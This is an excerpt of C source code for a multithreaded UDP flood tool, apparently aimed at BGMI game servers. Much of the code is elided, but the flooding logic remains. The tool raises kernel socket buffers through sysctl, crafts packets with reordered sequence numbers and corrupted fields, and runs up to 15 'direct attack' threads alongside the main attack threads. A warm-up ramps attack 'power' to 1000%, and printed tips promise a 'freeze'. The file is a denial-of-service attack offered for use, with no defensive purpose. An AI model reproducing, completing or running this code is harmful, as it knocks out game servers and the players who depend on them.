...
#define MAX_TOTAL_THREADS 1000
#define STATS_UPDATE_INTERVAL 2
#define RECONNECT_RETRIES 3
#define JITTER_RANGE 50
#define RECONNECT_INTERVAL 30000
#define REORDER_CHANCE 15
#define DIRECT_ATTACK_POWER 500
#define MAX_DIRECT_THREADS 15
#define INITIAL_PHASE_POWER 100
#define FINAL_PHASE_POWER 1000
...
void optimize_kernel() {
    ...
    system("sysctl -w net.core.rmem_default=67108864 >/dev/null 2>&1");
    ...
    system("sysctl -w net.ipv4.udp_mem='786432 1048576 1572864' >/dev/null 2>&1");
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    ...
    if (should_reorder_packet(seed) && seq > 30) {
        reorder_seq = seq - (5 + (fast_rand(seed) % 15));
    }
    ...
    if (size > 40 && (fast_rand(seed) % 100) < 30) {
        unsigned int *extra = (unsigned int*)(buf + 40);
        extra[0] = htonl(0xFFFFFFFF);
    }
}
...
int get_warmup_multiplier(int phase) {
    if (phase < 0) return INITIAL_PHASE_POWER;
    if (phase >= 10) return FINAL_PHASE_POWER;
    
    return INITIAL_PHASE_POWER + (phase * (FINAL_PHASE_POWER - INITIAL_PHASE_POWER) / 9);
}
...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            int burst_size = 100 + (power_level / 10);
            if (burst_size > 500) burst_size = 500;
...
void *attack_thread(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_burst < 10) current_burst = 10;
...
void *warmup_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds (100%% → 1000%% power)...\n", WARMUP_SECONDS);
    ...
    for (int phase = 0; phase < 10 && !atomic_load(&stop_signal); phase++) {
        ...
        printf("⚡ Phase %d: %d%% power\n", phase + 1, get_warmup_multiplier(phase));
    ...
    if (!atomic_load(&stop_signal)) {
        ...
        printf("✅ Warm-up complete (1000%% peak achieved)\n");
        printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    }
...
int main(int argc, char *argv[]) {
    ...
    if (max_threads > 0 && THREAD_COUNT > max_threads - 100) {
        THREAD_COUNT = max_threads - 100;
    }
#endif
    ...
    printf("📦 Packet Size: %d bytes (20-1024)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (10-900)\n", THREAD_COUNT);
    printf("⚡ Direct Attack Power: %d%%\n", DIRECT_ATTACK_POWER);
    printf("🔥 Warm-up: 100%% → 1000%% in 10s\n");
    printf("🔧 Optimized for 677ms continuous ping\n");
    printf("===============================================\n");
    
    if (PACKET_SIZE <= 40) {
        printf("💡 Tip: 20-40 bytes = Maximum PPS\n");
    } else if (PACKET_SIZE <= 100) {
        printf("💡 Tip: 41-100 bytes = Balanced freeze\n");
    } else {
        printf("💡 Tip: 101-1024 bytes = Corruption freeze\n");
    }
    printf("\n");
    ...
    pthread_t *direct_threads = malloc(MAX_DIRECT_THREADS * sizeof(pthread_t));
    int *direct_ids = malloc(MAX_DIRECT_THREADS * sizeof(int));
    
    if (direct_threads && direct_ids) {
        printf("🚀 Creating %d direct attack threads...\n", MAX_DIRECT_THREADS);
        for (int i = 0; i < MAX_DIRECT_THREADS; i++) {
            direct_ids[i] = 999999 - i;
            pthread_create(&direct_threads[i], NULL, direct_attack, &direct_ids[i]);
            usleep(1000);
        }
    }
    ...
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        if (direct_threads) free(direct_threads);
        if (direct_ids) free(direct_ids);
        return 1;
    }
    ...
    if (direct_threads) {
        for (int i = 0; i < MAX_DIRECT_THREADS; i++) {
            pthread_join(direct_threads[i], NULL);
        }
        free(direct_threads);
        free(direct_ids);
    }
